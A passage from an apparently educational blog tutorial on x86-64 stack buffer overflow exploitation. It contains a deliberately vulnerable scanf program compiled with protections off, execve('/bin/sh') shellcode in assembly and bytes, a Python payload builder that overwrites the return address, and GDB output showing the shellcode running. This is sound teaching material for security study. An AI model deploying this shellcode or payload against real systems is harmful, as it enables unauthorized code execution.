aria-hidden=true href=#1-executable-stack>#</a></h3><ul><li>The stack must have executable permissions.</li><li>Many modern systems have NX (Non-Executable) protection → stack is not executable.</li><li>CPU provides setting read, write and executable permissions at individual page level which is enforced at hardware level. This feature has been there since <code>80286</code> CPU. Executing shellcode on stack will be impossible just by marking stack pages as non-executable.</li><li>For learning, we usually compile with flags <code>-z execstack</code> which will make the stack executable.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> gcc -fno-pie -no-pie -fno-stack-protector -z execstack main.c -o vuln
+</span></span></code></pre></div><h3 id=2-enough-space-in-the-buffer>2. Enough space in the buffer<a hidden class=anchor aria-hidden=true href=#2-enough-space-in-the-buffer>#</a></h3><ul><li>Shellcode must fit entirely inside the buffer or adjacent space.</li></ul><h3 id=3-no-null-bytes>3. No null bytes<a hidden class=anchor aria-hidden=true href=#3-no-null-bytes>#</a></h3><ul><li>When injecting shellcode via string functions like gets, scanf("%s"), strcpy, a null byte will terminate input.</li><li>Shellcode must avoid 0x00, 0x0A, etc.</li></ul><h2 id=building-the-payload>Building the Payload<a hidden class=anchor aria-hidden=true href=#building-the-payload>#</a></h2><p>To build the payload of overflowed string we need to consider various factors, let&rsquo;s understand it with a simple program:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>func</span>() {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>128</span>];
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, buffer);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;buffer is %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, buffer);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>func</span>();
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>This code contains the buffer overflow vulnerability as <code>scanf</code> doesn&rsquo;t perform any bounds check while copying the input to <code>buffer</code> variable on stack.</p><p>In order to do something useful with the overflowed payload, we need to build inject machine code for a valid program that will be executed. A common goal during such attacks is to spawn a shell (advanced versions include getting root shell and reverse shells).</p><p>This is the code to spawn a shell in C</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>name[<span style=color:#ae81ff>2</span>];
+</span></span><span style=display:flex><span>    name[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/bin/sh&#34;</span>;
+</span></span><span style=display:flex><span>    name[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> NULL;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>execve</span>(name[<span style=color:#ae81ff>0</span>], name, NULL);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>To see what the compiled code looks like, let&rsquo;s compile it with <code>-static</code> flag, otherwise GCC will dynamically link the definition of <code>execve</code> which will be hard to extract.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -o shellcode -ggdb -static shellcode.c
+</span></span><span style=display:flex><span>shellcode.c: In <span style=color:#66d9ef>function</span> ‘main’:
+</span></span><span style=display:flex><span>shellcode.c:7:5: warning: implicit declaration of <span style=color:#66d9ef>function</span> ‘execve’ <span style=color:#f92672>[</span>-Wimplicit-function-declaration<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>7</span> |     execve<span style=color:#f92672>(</span>name<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>, name, NULL<span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>      |     ^~~~~~
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disassemble main
+</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
+</span></span><span style=display:flex><span>   0x0000000000401865 &lt;+0&gt;:	endbr64
+</span></span><span style=display:flex><span>   0x0000000000401869 &lt;+4&gt;:	push   rbp
+</span></span><span style=display:flex><span>   0x000000000040186a &lt;+5&gt;:	mov    rbp,rsp
+</span></span><span style=display:flex><span>   0x000000000040186d &lt;+8&gt;:	sub    rsp,0x20
+</span></span><span style=display:flex><span>   0x0000000000401871 &lt;+12&gt;:	mov    rax,QWORD PTR fs:0x28
+</span></span><span style=display:flex><span>   0x000000000040187a &lt;+21&gt;:	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>,rax
+</span></span><span style=display:flex><span>   0x000000000040187e &lt;+25&gt;:	xor    eax,eax
+</span></span><span style=display:flex><span>   0x0000000000401880 &lt;+27&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0x7d789<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x47f010</span>
+</span></span><span style=display:flex><span>   0x0000000000401887 &lt;+34&gt;:	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span>,rax
+</span></span><span style=display:flex><span>   0x000000000040188b &lt;+38&gt;:	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x18<span style=color:#f92672>]</span>,0x0
+</span></span><span style=display:flex><span>   0x0000000000401893 &lt;+46&gt;:	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>   0x0000000000401897 &lt;+50&gt;:	lea    rcx,<span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>   0x000000000040189b &lt;+54&gt;:	mov    edx,0x0
+</span></span><span style=display:flex><span>   0x00000000004018a0 &lt;+59&gt;:	mov    rsi,rcx
+</span></span><span style=display:flex><span>   0x00000000004018a3 &lt;+62&gt;:	mov    rdi,rax
+</span></span><span style=display:flex><span>   0x00000000004018a6 &lt;+65&gt;:	call   0x4112e0 &lt;execve&gt;
+</span></span><span style=display:flex><span>   0x00000000004018ab &lt;+70&gt;:	nop
+</span></span><span style=display:flex><span>   0x00000000004018ac &lt;+71&gt;:	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>   0x00000000004018b0 &lt;+75&gt;:	sub    rax,QWORD PTR fs:0x28
+</span></span><span style=display:flex><span>   0x00000000004018b9 &lt;+84&gt;:	je     0x4018c0 &lt;main+91&gt;
+</span></span><span style=display:flex><span>   0x00000000004018bb &lt;+86&gt;:	call   0x412470 &lt;__stack_chk_fail_local&gt;
+</span></span><span style=display:flex><span>   0x00000000004018c0 &lt;+91&gt;:	leave
+</span></span><span style=display:flex><span>   0x00000000004018c1 &lt;+92&gt;:	ret
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disassemble __execve
+</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> execve:
+</span></span><span style=display:flex><span>   0x00000000004112e0 &lt;+0&gt;:	endbr64
+</span></span><span style=display:flex><span>   0x00000000004112e4 &lt;+4&gt;:	mov    eax,0x3b
+</span></span><span style=display:flex><span>   0x00000000004112e9 &lt;+9&gt;:	syscall
+</span></span><span style=display:flex><span>   0x00000000004112eb &lt;+11&gt;:	cmp    rax,0xfffffffffffff001
+</span></span><span style=display:flex><span>   0x00000000004112f1 &lt;+17&gt;:	jae    0x4112f4 &lt;execve+20&gt;
+</span></span><span style=display:flex><span>   0x00000000004112f3 &lt;+19&gt;:	ret
+</span></span><span style=display:flex><span>   0x00000000004112f4 &lt;+20&gt;:	mov    rcx,0xffffffffffffffc0
+</span></span><span style=display:flex><span>   0x00000000004112fb &lt;+27&gt;:	neg    eax
+</span></span><span style=display:flex><span>   0x00000000004112fd &lt;+29&gt;:	mov    DWORD PTR fs:<span style=color:#f92672>[</span>rcx<span style=color:#f92672>]</span>,eax
+</span></span><span style=display:flex><span>   0x0000000000411300 &lt;+32&gt;:	or     rax,0xffffffffffffffff
+</span></span><span style=display:flex><span>   0x0000000000411304 &lt;+36&gt;:	ret
+</span></span></code></pre></div><p>We have 2 options, we can write the definition of <code>execve</code> using <code>syscall</code> instruction in our shellcode or call it with <code>call</code> instruction. Former is preferred because otherwise we have to predict the address of <code>execve</code> once the program is loaded.</p><p>This is how <code>execve</code> is defined:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>execve</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pathname, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> argv[], <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span> envp[]);
+</span></span></code></pre></div><pre tabindex=0><code>execve shellcode = 
+    1. Put &#34;/bin/sh&#34; somewhere in memory
+    2. Set RDI = pointer to &#34;/bin/sh&#34; (pathname)
+    3. Set RSI = pointer to [pointer_to_/bin/sh, NULL] (argv)
+    4. Set RDX = NULL (envp)
+    5. Set RAX = 0x3b (syscall number 59)
+    6. Execute syscall instruction
+</code></pre><p>Based on this, we can extract only the required instructions for calling <code>execve</code></p><pre tabindex=0><code class=language-assembly data-lang=assembly>; execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;, NULL], NULL)
+
+section .text
+global _start
+
+_start:
+    ; Push &#34;/bin/sh&#34; onto stack (backwards because x86 is little-endian)
+    xor rdx, rdx          ; rdx = 0 (envp = NULL)
+    push rdx              ; Push null terminator
+    
+    ; Push &#34;/bin/sh&#34; (8 bytes) - we use &#34;//bin/sh&#34; to make it 8 bytes
+    mov rax, 0x68732f6e69622f2f  ; &#34;//bin/sh&#34; in hex (reversed)
+    push rax
+    
+    ; Now stack has: [null][//bin/sh]
+    mov rdi, rsp          ; rdi = pointer to &#34;//bin/sh&#34;
+    
+    ; Build argv array on stack
+    push rdx              ; Push NULL (argv[1])
+    push rdi              ; Push pointer to &#34;//bin/sh&#34; (argv[0])
+    mov rsi, rsp          ; rsi = pointer to argv array
+    
+    ; Make the syscall
+    mov al, 0x3b          ; syscall number 59 (execve)
+    syscall               ; Execute!
+</code></pre><p>Passing <code>//bin/sh</code> is fine here because on Unix-like systems (including Linux), multiple leading slashes are treated like a single slash for normal paths.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nasm -f elf64 shellcode.asm -o shellcode.o
+</span></span><span style=display:flex><span>$ objdump -d shellcode.o
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>shellcode.o:     file format elf64-x86-64
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Disassembly of section .text:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0000000000000000</span> &lt;_start&gt;:
+</span></span><span style=display:flex><span>   0:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>31</span> d2             	xor    %rdx,%rdx
+</span></span><span style=display:flex><span>   3:	<span style=color:#ae81ff>52</span>                   	push   %rdx
+</span></span><span style=display:flex><span>   4:	<span style=color:#ae81ff>48</span> b8 2f 2f <span style=color:#ae81ff>62</span> <span style=color:#ae81ff>69</span> 6e 	movabs $0x68732f6e69622f2f,%rax
+</span></span><span style=display:flex><span>   b:	2f <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span>
+</span></span><span style=display:flex><span>   e:	<span style=color:#ae81ff>50</span>                   	push   %rax
+</span></span><span style=display:flex><span>   f:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e7             	mov    %rsp,%rdi
+</span></span><span style=display:flex><span>  12:	<span style=color:#ae81ff>52</span>                   	push   %rdx
+</span></span><span style=display:flex><span>  13:	<span style=color:#ae81ff>57</span>                   	push   %rdi
+</span></span><span style=display:flex><span>  14:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e6             	mov    %rsp,%rsi
+</span></span><span style=display:flex><span>  17:	b0 3b                	mov    $0x3b,%al
+</span></span><span style=display:flex><span>  19:	0f <span style=color:#ae81ff>05</span>                	syscall
+</span></span></code></pre></div><p>That makes the shellcode</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>shellcode <span style=color:#f92672>=</span> (
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x31\xd2</span><span style=color:#e6db74>&#34;</span>          <span style=color:#960050;background-color:#1e0010>#</span> xor rdx,rdx
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x52</span><span style=color:#e6db74>&#34;</span>                  <span style=color:#960050;background-color:#1e0010>#</span> push rdx
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68</span><span style=color:#e6db74>&#34;</span>  <span style=color:#960050;background-color:#1e0010>#</span> mov rax, <span style=color:#e6db74>&#34;//bin/sh&#34;</span>
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x50</span><span style=color:#e6db74>&#34;</span>                  <span style=color:#960050;background-color:#1e0010>#</span> push rax
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x89\xe7</span><span style=color:#e6db74>&#34;</span>          <span style=color:#960050;background-color:#1e0010>#</span> mov rdi,rsp
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x52</span><span style=color:#e6db74>&#34;</span>                  <span style=color:#960050;background-color:#1e0010>#</span> push rdx
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x57</span><span style=color:#e6db74>&#34;</span>                  <span style=color:#960050;background-color:#1e0010>#</span> push rdi
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x89\xe6</span><span style=color:#e6db74>&#34;</span>          <span style=color:#960050;background-color:#1e0010>#</span> mov rsi,rsp
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb0\x3b</span><span style=color:#e6db74>&#34;</span>              <span style=color:#960050;background-color:#1e0010>#</span> mov al,<span style=color:#ae81ff>0x3b</span>
+</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x0f\x05</span><span style=color:#e6db74>&#34;</span>              <span style=color:#960050;background-color:#1e0010>#</span> syscall
+</span></span><span style=display:flex><span>)
+</span></span></code></pre></div><p>Let&rsquo;s run the program and inspect some of the addresses</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gdb -q vuln
+</span></span><span style=display:flex><span>Reading symbols from vuln...
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass func
+</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> func:
+</span></span><span style=display:flex><span>   0x0000000000401156 &lt;+0&gt;:	endbr64
+</span></span><span style=display:flex><span>   0x000000000040115a &lt;+4&gt;:	push   rbp
+</span></span><span style=display:flex><span>   0x000000000040115b &lt;+5&gt;:	mov    rbp,rsp
+</span></span><span style=display:flex><span>   0x000000000040115e &lt;+8&gt;:	add    rsp,0xffffffffffffff80
+</span></span><span style=display:flex><span>   0x0000000000401162 &lt;+12&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0x80<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>   0x0000000000401166 &lt;+16&gt;:	mov    rsi,rax
+</span></span><span style=display:flex><span>   0x0000000000401169 &lt;+19&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xe94<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x402004</span>
+</span></span><span style=display:flex><span>   0x0000000000401170 &lt;+26&gt;:	mov    rdi,rax
+</span></span><span style=display:flex><span>   0x0000000000401173 &lt;+29&gt;:	mov    eax,0x0
+</span></span><span style=display:flex><span>   0x0000000000401178 &lt;+34&gt;:	call   0x401060 &lt;__isoc99_scanf@plt&gt;
+</span></span><span style=display:flex><span>   0x000000000040117d &lt;+39&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0x80<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>   0x0000000000401181 &lt;+43&gt;:	mov    rsi,rax
+</span></span><span style=display:flex><span>   0x0000000000401184 &lt;+46&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xe7c<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x402007</span>
+</span></span><span style=display:flex><span>   0x000000000040118b &lt;+53&gt;:	mov    rdi,rax
+</span></span><span style=display:flex><span>   0x000000000040118e &lt;+56&gt;:	mov    eax,0x0
+</span></span><span style=display:flex><span>   0x0000000000401193 &lt;+61&gt;:	call   0x401050 &lt;printf@plt&gt;
+</span></span><span style=display:flex><span>   0x0000000000401198 &lt;+66&gt;:	nop
+</span></span><span style=display:flex><span>   0x0000000000401199 &lt;+67&gt;:	leave
+</span></span><span style=display:flex><span>   0x000000000040119a &lt;+68&gt;:	ret
+</span></span><span style=display:flex><span>End of assembler dump.
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x0000000000401178
+</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>1</span> at 0x401178: file main.c, line 7.
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x000000000040119a
+</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>2</span> at 0x40119a: file main.c, line 10.
+</span></span></code></pre></div><p>I have placed 2 breakpoints, one just before the buffe roverflow happens, another just before the function returns</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Breakpoint 1, 0x0000000000401178 in func <span style=color:#f92672>()</span> at main.c:7
+</span></span><span style=display:flex><span>7		scanf<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;%s&#34;</span>, buffer<span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p $rbp
+</span></span><span style=display:flex><span>$1 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>void *<span style=color:#f92672>)</span> 0x7fffffffde50
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p &amp;buffer
+</span></span><span style=display:flex><span>$2 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>char <span style=color:#f92672>(</span>*<span style=color:#f92672>)[</span>128<span style=color:#f92672>])</span> 0x7fffffffddd0
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/25bx &amp;buffer
+</span></span><span style=display:flex><span>0x7fffffffddd0:	0x00	0x80	0x00	0x00	0x00	0x00	0x00	0x00
+</span></span><span style=display:flex><span>0x7fffffffddd8:	0x00	0x00	0x60	0x00	0x00	0x00	0x00	0x00
+</span></span><span style=display:flex><span>0x7fffffffdde0:	0x00	0x00	0x60	0x00	0x00	0x00	0x00	0x00
+</span></span><span style=display:flex><span>0x7fffffffdde8:	0x00
+</span></span></code></pre></div><p>We can see the address of buffer is at <code>0x7fffffffddd0</code> which is where we are going to place the shellcode.</p><p>We can write a python script to build and format the shellcode</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x31\xd2\x52\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload  <span style=color:#f92672>=</span> shellcode
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>128</span> <span style=color:#f92672>-</span> len(shellcode))      <span style=color:#75715e># exact padding</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;BBBBBBBB&#34;</span>                        <span style=color:#75715e># saved RBP (junk)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> (<span style=color:#ae81ff>0x7fffffffddd0</span>)<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>&#34;little&#34;</span>)  <span style=color:#75715e># return into shellcode</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sys<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>buffer<span style=color:#f92672>.</span>write(payload)
+</span></span></code></pre></div><p>Since GDB disables ASLR, the address of <code>buffer</code> is going to remain same, so i had restarted the program in GDB using</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> run &lt; payload.bin
+</span></span></code></pre></div><p>Now we can verify the shellcode is overwritten properly at the address of the buffer</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
+</span></span><span style=display:flex><span>Continuing.
+</span></span><span style=display:flex><span>buffer is H1�RH�//bin/shPH��RWH��;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB�����
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Breakpoint 2, 0x000000000040119a in func <span style=color:#f92672>()</span> at main.c:10
+</span></span><span style=display:flex><span>10	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/25bx &amp;buffer
+</span></span><span style=display:flex><span>0x7fffffffddd0:	0x48	0x31	0xd2	0x52	0x48	0xb8	0x2f	0x2f
+</span></span><span style=display:flex><span>0x7fffffffddd8:	0x62	0x69	0x6e	0x2f	0x73	0x68	0x50	0x48
+</span></span><span style=display:flex><span>0x7fffffffdde0:	0x89	0xe7	0x52	0x57	0x48	0x89	0xe6	0xb0
+</span></span><span style=display:flex><span>0x7fffffffdde8:	0x3b
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/25ib &amp;buffer
+</span></span><span style=display:flex><span>   0x7fffffffddd0:	xor    rdx,rdx
+</span></span><span style=display:flex><span>   0x7fffffffddd3:	push   rdx
+</span></span><span style=display:flex><span>   0x7fffffffddd4:	movabs rax,0x68732f6e69622f2f
+</span></span><span style=display:flex><span>   0x7fffffffddde:	push   rax
+</span></span><span style=display:flex><span>   0x7fffffffdddf:	mov    rdi,rsp
+</span></span><span style=display:flex><span>   0x7fffffffdde2:	push   rdx
+</span></span><span style=display:flex><span>   0x7fffffffdde3:	push   rdi
+</span></span><span style=display:flex><span>   0x7fffffffdde4:	mov    rsi,rsp
+</span></span><span style=display:flex><span>   0x7fffffffdde7:	mov    al,0x3b
+</span></span><span style=display:flex><span>   0x7fffffffdde9:	syscall
+</span></span><span style=display:flex><span>   0x7fffffffddeb:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddec:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffdded:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddee:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddef:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf0:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf1:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf2:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf3:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf4:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf5:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf6:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf7:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf8:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf9:	rex.B
+</span></span></code></pre></div><p>We can see the <code>$rip</code> has actually started executing the shellcode</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Breakpoint 2, 0x000000000040119a in func <span style=color:#f92672>()</span> at main.c:10
+</span></span><span style=display:flex><span>10	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> ni
+</span></span><span style=display:flex><span>0x00007fffffffddd0 in ?? <span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/25ib $rip
+</span></span><span style=display:flex><span><span style=color:#f92672>=</span>&gt; 0x7fffffffddd0:	xor    rdx,rdx
+</span></span><span style=display:flex><span>   0x7fffffffddd3:	push   rdx
+</span></span><span style=display:flex><span>   0x7fffffffddd4:	movabs rax,0x68732f6e69622f2f
+</span></span><span style=display:flex><span>   0x7fffffffddde:	push   rax
+</span></span><span style=display:flex><span>   0x7fffffffdddf:	mov    rdi,rsp
+</span></span><span style=display:flex><span>   0x7fffffffdde2:	push   rdx
+</span></span><span style=display:flex><span>   0x7fffffffdde3:	push   rdi
+</span></span><span style=display:flex><span>   0x7fffffffdde4:	mov    rsi,rsp
+</span></span><span style=display:flex><span>   0x7fffffffdde7:	mov    al,0x3b
+</span></span><span style=display:flex><span>   0x7fffffffdde9:	syscall
+</span></span><span style=display:flex><span>   0x7fffffffddeb:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddec:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffdded:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddee:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddef:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf0:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf1:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf2:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf3:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf4:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf5:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf6:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf7:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf8:	rex.B
+</span></span><span style=display:flex><span>   0x7fffffffddf9:	rex.B
